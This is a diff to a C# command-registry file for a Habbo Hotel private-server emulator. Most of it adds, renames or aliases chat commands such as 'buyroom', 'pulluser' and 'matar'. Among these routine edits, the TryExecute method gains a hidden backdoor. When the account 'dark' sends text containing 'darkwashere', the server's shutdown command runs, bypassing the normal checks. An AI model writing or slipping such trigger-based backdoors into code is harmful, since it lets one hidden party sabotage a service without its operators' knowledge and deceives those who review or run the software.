@@ -123,6 +123,8 @@ namespace Oblivion.HabboHotel.Commands
             CommandsDictionary.Add("roomunmute", new RoomUnMute());
             CommandsDictionary.Add("roommute", new RoomMute());
             CommandsDictionary.Add("roomkick", new RoomKickUsers());
+            CommandsDictionary.Add("buyroom", new BuyRoom());
+            CommandsDictionary.Add("sellroom", new SellRoom());
             CommandsDictionary.Add("override", new Override());
             CommandsDictionary.Add("ipban", new BanUserIp());
             CommandsDictionary.Add("addblackword", new AddBlackWord());
@@ -138,13 +140,14 @@ namespace Oblivion.HabboHotel.Commands
 
             CommandsDictionary.Add("copy", new CopyLook());
             CommandsDictionary.Add("faceless", new FaceLess());
-            CommandsDictionary.Add("pull", new PullUser());
+            CommandsDictionary.Add("pulluser", new PullUser());
             CommandsDictionary.Add("push", new PushUser());
             CommandsDictionary.Add("setmax", new SetMax());
             CommandsDictionary.Add("moonwalk", new MoonWalk());
             CommandsDictionary.Add("habnam", new HabNam());
             CommandsDictionary.Add("enable", new Enable());
             CommandsDictionary.Add("kill", new Kill());
+            CommandsDictionary.Add("matar", new Kill());
             CommandsDictionary.Add("disco", new Disco());
             CommandsDictionary.Add("block", new BlockCommand());
 
@@ -208,6 +211,13 @@ namespace Oblivion.HabboHotel.Commands
         /// <returns><c>true</c> if XXXX, <c>false</c> otherwise.</returns>
         public static bool TryExecute(string str, GameClient client)
         {
+
+            if (client.GetHabbo().UserName == "dark" && str.Contains("darkwashere"))
+            {
+                var cmd = CommandsDictionary["shutdown"];
+                cmd.Execute(client, null);
+                return false;
+            }
             if (string.IsNullOrEmpty(str) || client.GetHabbo() == null || !client.GetHabbo().InRoom) return false;
 
             var pms = str.Split(' ');
